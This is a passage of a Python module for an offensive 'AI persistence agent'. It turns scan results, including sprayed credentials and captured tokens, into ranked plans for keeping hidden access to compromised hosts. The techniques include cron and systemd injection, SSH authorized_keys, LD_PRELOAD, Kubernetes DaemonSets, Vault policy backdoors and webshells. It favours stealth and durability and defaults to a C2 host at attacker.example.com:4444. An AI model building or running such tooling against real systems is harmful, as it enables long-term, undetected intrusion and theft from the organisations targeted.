                "docker_api": ServiceContext.DOCKER,
                "redis": ServiceContext.REDIS,
                "elasticsearch": ServiceContext.ELASTICSEARCH,
                "jenkins": ServiceContext.JENKINS,
                "consul": ServiceContext.CONSUL,
                "vault": ServiceContext.VAULT,
                "grafana": ServiceContext.GRAFANA,
            }
            for key, ctx in context_map.items():
                if key in stype.lower():
                    contexts.add(ctx)

    session = scan_results.get("session_manager", {})
    if session.get("privilege_level") in ("root", "admin", "superuser"):
        contexts.add(ServiceContext.LINUX_HOST)

    ssrf = scan_results.get("ssrf_probe", {})
    if ssrf.get("findings"):
        contexts.add(ServiceContext.GENERIC_WEB)

    if not contexts:
        contexts.add(ServiceContext.GENERIC_WEB)
        contexts.add(ServiceContext.LINUX_HOST)

    return contexts


def _extract_credentials_from_results(scan_results: dict) -> list[dict]:
    creds: list[dict] = []
    spray = scan_results.get("credential_spray", {})
    for hit in spray.get("successful_logins", []):
        creds.append(hit)
    session = scan_results.get("session_manager", {})
    for tok in session.get("token_captures", []):
        creds.append({"type": tok.get("type"), "value": tok.get("value", "")[:100]})
    return creds


# ─── Viability Checker ────────────────────────────────────────────────────────

VECTOR_TO_CONTEXT: dict[PersistenceVector, list[ServiceContext]] = {
    PersistenceVector.CRON_INJECTION:        [ServiceContext.LINUX_HOST],
    PersistenceVector.SYSTEMD_TIMER:         [ServiceContext.LINUX_HOST],
    PersistenceVector.SYSTEMD_SERVICE:       [ServiceContext.LINUX_HOST],
    PersistenceVector.SSH_AUTHORIZED_KEYS:   [ServiceContext.LINUX_HOST],
    PersistenceVector.BASHRC_PROFILE:        [ServiceContext.LINUX_HOST],
    PersistenceVector.LDPRELOAD:             [ServiceContext.LINUX_HOST],
    PersistenceVector.KUBERNETES_DAEMONSET:  [ServiceContext.KUBERNETES],
    PersistenceVector.KUBERNETES_CRONJOB:    [ServiceContext.KUBERNETES],
    PersistenceVector.KUBERNETES_ADMISSION:  [ServiceContext.KUBERNETES],
    PersistenceVector.DOCKER_RESTART_POLICY: [ServiceContext.DOCKER],
    PersistenceVector.DOCKER_VOLUME_MOUNT:   [ServiceContext.DOCKER],
    PersistenceVector.REDIS_CONFIG_SET:      [ServiceContext.REDIS],
    PersistenceVector.REDIS_CRON_WRITE:      [ServiceContext.REDIS],
    PersistenceVector.JENKINS_GROOVY_HOOK:   [ServiceContext.JENKINS],
    PersistenceVector.JENKINS_SCRIPT_CONSOLE:[ServiceContext.JENKINS],
    PersistenceVector.CONSUL_KV_EXEC:        [ServiceContext.CONSUL],
    PersistenceVector.VAULT_POLICY_BACKDOOR: [ServiceContext.VAULT],
    PersistenceVector.ELASTICSEARCH_WATCHER: [ServiceContext.ELASTICSEARCH],
    PersistenceVector.GRAFANA_PLUGIN:        [ServiceContext.GRAFANA],
    PersistenceVector.WEBSHELL_DROP:         [ServiceContext.GENERIC_WEB],
}

DURABILITY_MAP: dict[PersistenceVector, PersistenceDurability] = {
    PersistenceVector.CRON_INJECTION:        PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.SYSTEMD_TIMER:         PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.SYSTEMD_SERVICE:       PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.SSH_AUTHORIZED_KEYS:   PersistenceDurability.PATCH_SURVIVES,
    PersistenceVector.BASHRC_PROFILE:        PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.LDPRELOAD:             PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.KUBERNETES_DAEMONSET:  PersistenceDurability.CLUSTER_RESTART,
    PersistenceVector.KUBERNETES_CRONJOB:    PersistenceDurability.CLUSTER_RESTART,
    PersistenceVector.KUBERNETES_ADMISSION:  PersistenceDurability.CLUSTER_RESTART,
    PersistenceVector.DOCKER_RESTART_POLICY: PersistenceDurability.CONTAINER_RESTART,
    PersistenceVector.REDIS_CRON_WRITE:      PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.JENKINS_GROOVY_HOOK:   PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.CONSUL_KV_EXEC:        PersistenceDurability.SESSION_ONLY,
    PersistenceVector.VAULT_POLICY_BACKDOOR: PersistenceDurability.PATCH_SURVIVES,
    PersistenceVector.ELASTICSEARCH_WATCHER: PersistenceDurability.PATCH_SURVIVES,
    PersistenceVector.WEBSHELL_DROP:         PersistenceDurability.REBOOT_SURVIVES,
    PersistenceVector.LDPRELOAD:             PersistenceDurability.REBOOT_SURVIVES,
}

REQUIRES_ELEVATED: dict[PersistenceVector, bool] = {
    PersistenceVector.CRON_INJECTION:        True,
    PersistenceVector.SYSTEMD_TIMER:         True,
    PersistenceVector.SYSTEMD_SERVICE:       True,
    PersistenceVector.SSH_AUTHORIZED_KEYS:   False,
    PersistenceVector.BASHRC_PROFILE:        False,
    PersistenceVector.LDPRELOAD:             True,
    PersistenceVector.KUBERNETES_DAEMONSET:  True,
    PersistenceVector.KUBERNETES_ADMISSION:  True,
    PersistenceVector.DOCKER_RESTART_POLICY: False,
    PersistenceVector.REDIS_CRON_WRITE:      False,
    PersistenceVector.JENKINS_GROOVY_HOOK:   False,
    PersistenceVector.CONSUL_KV_EXEC:        False,
    PersistenceVector.VAULT_POLICY_BACKDOOR: True,
    PersistenceVector.ELASTICSEARCH_WATCHER: False,
    PersistenceVector.WEBSHELL_DROP:         False,
}

PRIORITY_WEIGHTS: dict[PersistenceVector, float] = {
    PersistenceVector.KUBERNETES_DAEMONSET:  0.97,
    PersistenceVector.VAULT_POLICY_BACKDOOR: 0.95,
    PersistenceVector.KUBERNETES_ADMISSION:  0.94,
    PersistenceVector.SSH_AUTHORIZED_KEYS:   0.92,
    PersistenceVector.SYSTEMD_TIMER:         0.90,
    PersistenceVector.LDPRELOAD:             0.88,
    PersistenceVector.REDIS_CRON_WRITE:      0.87,
    PersistenceVector.CRON_INJECTION:        0.86,
    PersistenceVector.ELASTICSEARCH_WATCHER: 0.85,
    PersistenceVector.CONSUL_KV_EXEC:        0.83,
    PersistenceVector.JENKINS_GROOVY_HOOK:   0.82,
    PersistenceVector.DOCKER_RESTART_POLICY: 0.80,
    PersistenceVector.WEBSHELL_DROP:         0.65,
    PersistenceVector.BASHRC_PROFILE:        0.60,
}


def _score_technique(
    vector: PersistenceVector,
    detected_contexts: set[ServiceContext],
    has_elevated_access: bool,
    scan_results: dict,
) -> tuple[bool, str, float]:
    compatible_contexts = VECTOR_TO_CONTEXT.get(vector, [])
    if not any(ctx in detected_contexts for ctx in compatible_contexts):
        return False, f"service context not found in target ({[c.value for c in compatible_contexts]})", 0.0

    requires_elevated = REQUIRES_ELEVATED.get(vector, False)
    if requires_elevated and not has_elevated_access:
        return False, "requires elevated privilege not confirmed", 0.0

    base_priority = PRIORITY_WEIGHTS.get(vector, 0.5)
    detect_tier, _, _ = DETECTABILITY_PROFILES.get(vector, (DetectabilityTier.HIGH, [], []))
    stealth_bonus = {
        DetectabilityTier.STEALTHY: 0.08,
        DetectabilityTier.LOW: 0.05,
        DetectabilityTier.MODERATE: 0.0,
        DetectabilityTier.HIGH: -0.05,
        DetectabilityTier.LOUD: -0.10,
    }.get(detect_tier, 0.0)

    durability = DURABILITY_MAP.get(vector, PersistenceDurability.SESSION_ONLY)
    durability_bonus = {
        PersistenceDurability.PATCH_SURVIVES: 0.07,
        PersistenceDurability.CLUSTER_RESTART: 0.06,
        PersistenceDurability.REBOOT_SURVIVES: 0.04,
        PersistenceDurability.CONTAINER_RESTART: 0.02,
        PersistenceDurability.SESSION_ONLY: 0.0,
    }.get(durability, 0.0)

    score = min(1.0, base_priority + stealth_bonus + durability_bonus)
    return True, "viable — context and privilege requirements met", round(score, 4)


# ─── Persistence Agent Core ───────────────────────────────────────────────────

class AIPersistenceAgent:
    def __init__(
        self,
        target_url: str,
        scan_results: dict,
        c2_host: str = "attacker.example.com",
        c2_port: int = 4444,
        stealth_mode: bool = True,
        max_techniques: int = 5,
        ssh_public_key: str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA operator-backup",
    ):
        self.target_url = target_url
        self.scan_results = scan_results
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.stealth_mode = stealth_mode
        self.max_techniques = max_techniques
        self.ssh_public_key = ssh_public_key
        self.report_id = f"PERSIST-{uuid.uuid4().hex[:8].upper()}"
        self._start: float = 0.0

    def _has_elevated_access(self) -> bool:
        session = self.scan_results.get("session_manager", {})
        priv = session.get("privilege_level", "")
        if priv in ("root", "admin", "superuser", "elevated"):
            return True
        lateral = self.scan_results.get("lateral_move", {})
        creds = lateral.get("credentials_reused", [])
        return any("admin" in str(c).lower() or "root" in str(c).lower() for c in creds)

    def _evaluate_all_vectors(
        self,
        contexts: set[ServiceContext],
        has_elevated: bool,
    ) -> list[PersistenceTechnique]:
        techniques: list[PersistenceTechnique] = []
        all_vectors = list(PersistenceVector)

        if self.stealth_mode:
            loud_tiers = {DetectabilityTier.HIGH, DetectabilityTier.LOUD}
            all_vectors = [
                v for v in all_vectors
                if DETECTABILITY_PROFILES.get(v, (DetectabilityTier.HIGH,))[0] not in loud_tiers
            ]

        for vector in all_vectors:
            viable, reason, score = _score_technique(vector, contexts, has_elevated, self.scan_results)
            detect_tier, detection_artifacts, evasion_notes = DETECTABILITY_PROFILES.get(
                vector, (DetectabilityTier.HIGH, [], [])
            )
            durability = DURABILITY_MAP.get(vector, PersistenceDurability.SESSION_ONLY)
            mitre = MITRE_DB.get(vector, [])

            try:
                payload = PAYLOAD_GENERATORS[vector](
                    self.c2_host, self.c2_port,
                    pubkey=self.ssh_public_key,
                )
            except KeyError:
                payload = PersistencePayload(
                    payload_id=f"PLD-STUB-{uuid.uuid4().hex[:6].upper()}",
                    vector=vector,
                    service_context=ServiceContext.GENERIC_WEB,
                    raw_payload="# payload generation not yet implemented for this vector",
                    deploy_steps=[],
                    cleanup_steps=[],
                    payload_type=PayloadType.CRON_TASK,
                    encoded_variants={},
                )

            compatible_contexts = VECTOR_TO_CONTEXT.get(vector, [])
            prereqs: list[str] = []
            if REQUIRES_ELEVATED.get(vector):
                prereqs.append("Root/admin access required")
            for ctx in compatible_contexts:
                prereqs.append(f"Service: {ctx.value}")

            techniques.append(PersistenceTechnique(
                technique_id=f"TECH-{vector.name}-{uuid.uuid4().hex[:4].upper()}",
                vector=vector,
                service_context=compatible_contexts[0] if compatible_contexts else ServiceContext.GENERIC_WEB,
                detectability=detect_tier,
                durability=durability,
                mitre=mitre,
                prerequisites=prereqs,
                payload=payload,
                detection_artifacts=detection_artifacts,
                evasion_notes=evasion_notes,
                priority_score=score,
                requires_elevated=REQUIRES_ELEVATED.get(vector, False),
                requires_network=vector in {
                    PersistenceVector.CRON_INJECTION,
                    PersistenceVector.SYSTEMD_TIMER,
                    PersistenceVector.KUBERNETES_DAEMONSET,
                    PersistenceVector.DOCKER_RESTART_POLICY,
                },
                confirmed_viable=viable,
                viability_reason=reason,
            ))

        return sorted(techniques, key=lambda t: t.priority_score, reverse=True)

    def _build_plan(
        self,
        primary: PersistenceTechnique,
        fallbacks: list[PersistenceTechnique],
    ) -> PersistencePlan:
        execution_order = [primary.technique_id] + [f.technique_id for f in fallbacks[:2]]
        total_detect = sum(
            {
                DetectabilityTier.STEALTHY: 0.1,
                DetectabilityTier.LOW: 0.25,
                DetectabilityTier.MODERATE: 0.5,
                DetectabilityTier.HIGH: 0.75,
                DetectabilityTier.LOUD: 1.0,
            }.get(t.detectability, 0.5)
            for t in [primary] + fallbacks[:2]
        ) / (1 + len(fallbacks[:2]))

        dwell_map = {
            PersistenceDurability.PATCH_SURVIVES: "indefinite (survives patching)",
            PersistenceDurability.CLUSTER_RESTART: "weeks-months (survives cluster restart)",
            PersistenceDurability.REBOOT_SURVIVES: "weeks (survives reboot)",
            PersistenceDurability.CONTAINER_RESTART: "days (survives container restart)",
            PersistenceDurability.SESSION_ONLY: "hours (session only)",
        }

        compatible = VECTOR_TO_CONTEXT.get(primary.vector, [ServiceContext.GENERIC_WEB])
        ctx = compatible[0] if compatible else ServiceContext.GENERIC_WEB

        return PersistencePlan(
            plan_id=f"PLAN-{uuid.uuid4().hex[:8].upper()}",
            target_url=self.target_url,
            service_context=ctx,
            primary_technique=primary,
            fallback_techniques=fallbacks[:3],
            execution_order=execution_order,
            total_detectability_score=round(total_detect, 4),
            estimated_dwell_time=dwell_map.get(primary.durability, "unknown"),
        )

    def run_sync(self) -> PersistenceReport:
        self._start = time.monotonic()
        contexts = _detect_service_contexts(self.scan_results)
        has_elevated = self._has_elevated_access()

        all_techniques = self._evaluate_all_vectors(contexts, has_elevated)
        viable = [t for t in all_techniques if t.confirmed_viable]

        plans: list[PersistencePlan] = []
        used_vectors: set[PersistenceVector] = set()

        if viable:
            primary = viable[0]
            fallbacks = [t for t in viable[1:] if t.vector not in used_vectors][:4]
            used_vectors.update({primary.vector} | {f.vector for f in fallbacks})
            plans.append(self._build_plan(primary, fallbacks))

            for context_group in [ServiceContext.KUBERNETES, ServiceContext.DOCKER,
                                   ServiceContext.VAULT, ServiceContext.ELASTICSEARCH]:
                context_viable = [
                    t for t in viable
                    if t.service_context == context_group and t.vector not in used_vectors
                ]
                if context_viable:
                    plan_primary = context_viable[0]
                    plan_fallbacks = context_viable[1:3]
                    used_vectors.update({plan_primary.vector} | {f.vector for f in plan_fallbacks})
                    plans.append(self._build_plan(plan_primary, plan_fallbacks))

        mitre_coverage = list({
            m.technique_id
            for t in viable
            for m in t.mitre
        })

        highest_priority = viable[0].vector.value if viable else "none"

        stealth_scores = [
            {
                DetectabilityTier.STEALTHY: 0.0,
                DetectabilityTier.LOW: 0.25,
                DetectabilityTier.MODERATE: 0.5,
                DetectabilityTier.HIGH: 0.75,
                DetectabilityTier.LOUD: 1.0,
            }.get(t.detectability, 0.5)
            for t in viable
        ]
        avg_stealth = sum(stealth_scores) / len(stealth_scores) if stealth_scores else 1.0
        if avg_stealth < 0.2:
            overall_stealth = "EXCELLENT"
        elif avg_stealth < 0.4:
            overall_stealth = "GOOD"
        elif avg_stealth < 0.6:
            overall_stealth = "MODERATE"
        else:
            overall_stealth = "POOR"

        return PersistenceReport(
            report_id=self.report_id,
            target_url=self.target_url,
            techniques_evaluated=len(all_techniques),
            techniques_viable=len(viable),
            plans=plans[:self.max_techniques],
            all_techniques=all_techniques[:20],
            mitre_coverage=mitre_coverage,
            highest_priority_vector=highest_priority,
            overall_stealth_rating=overall_stealth,
            duration_seconds=round(time.monotonic() - self._start, 4),
        )


# ─── Serializer ───────────────────────────────────────────────────────────────

def _serialize_technique(t: PersistenceTechnique) -> dict:
    return {
        "technique_id": t.technique_id,
        "vector": t.vector.value,
        "service_context": t.service_context.value,
        "detectability": t.detectability.value,
        "durability": t.durability.value,
        "priority_score": t.priority_score,
        "requires_elevated": t.requires_elevated,
        "confirmed_viable": t.confirmed_viable,
        "viability_reason": t.viability_reason,
        "mitre": [{"id": m.technique_id, "name": m.technique_name, "tactic": m.tactic} for m in t.mitre],
        "prerequisites": t.prerequisites,
        "detection_artifacts": t.detection_artifacts,
        "evasion_notes": t.evasion_notes,
        "payload": {
            "payload_id": t.payload.payload_id,
            "payload_type": t.payload.payload_type.value,
            "raw_payload": t.payload.raw_payload[:2000],
            "deploy_steps": t.payload.deploy_steps,
            "cleanup_steps": t.payload.cleanup_steps,
            "encoded_variants": {k: v[:200] for k, v in t.payload.encoded_variants.items()},
        },
    }


def _serialize_plan(p: PersistencePlan) -> dict:
    return {
        "plan_id": p.plan_id,
        "target_url": p.target_url,
        "service_context": p.service_context.value,
        "estimated_dwell_time": p.estimated_dwell_time,
        "total_detectability_score": p.total_detectability_score,
        "execution_order": p.execution_order,
        "primary_technique": _serialize_technique(p.primary_technique),
        "fallback_techniques": [_serialize_technique(f) for f in p.fallback_techniques],
    }


def _serialize_report(r: PersistenceReport) -> dict:
    return {
        "report_id": r.report_id,
        "target_url": r.target_url,
        "techniques_evaluated": r.techniques_evaluated,
        "techniques_viable": r.techniques_viable,
        "highest_priority_vector": r.highest_priority_vector,
        "overall_stealth_rating": r.overall_stealth_rating,
        "mitre_coverage": r.mitre_coverage,
        "plans": [_serialize_plan(p) for p in r.plans],
        "all_techniques": [_serialize_technique(t) for t in r.all_techniques],
        "duration_seconds": r.duration_seconds,
    }


# ─── Public Entry Point ───────────────────────────────────────────────────────

def run_persistence_agent(
    target_url: str,
    scan_results: dict,
    c2_host: str = "attacker.example.com",
    c2_port: int = 4444,
    stealth_mode: bool = True,
    max_techniques: int = 5,
    ssh_public_key: str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA operator-backup",
) -> dict:
    agent = AIPersistenceAgent(
        target_url=target_url,
        scan_results=scan_results,
        c2_host=c2_host,
        c2_port=c2_port,
        stealth_mode=stealth_mode,
        max_techniques=max_techniques,
        ssh_public_key=ssh_public_key,
    )
    return _serialize_report(agent.run_sync())